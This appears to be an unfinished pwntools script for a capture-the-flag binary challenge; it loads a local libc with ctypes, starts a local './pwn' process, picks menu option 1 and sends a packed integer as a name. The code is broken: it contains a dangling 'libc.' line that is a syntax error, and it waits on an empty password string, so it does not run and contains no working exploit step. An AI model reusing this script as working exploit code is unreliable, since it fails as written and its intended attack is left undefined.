from pwn import *
import ctypes
libc = ctypes.cdll.LoadLibrary("./libc.so.6")
libc.

io = process("./pwn")

io.recvuntil(b"Your choice: ")
io.sendline(b"1")
io.recvuntil(b"Input your name: ")
io.sendline(p64(0x696D6e61))
passwd = b""
io.recvuntil(passwd)
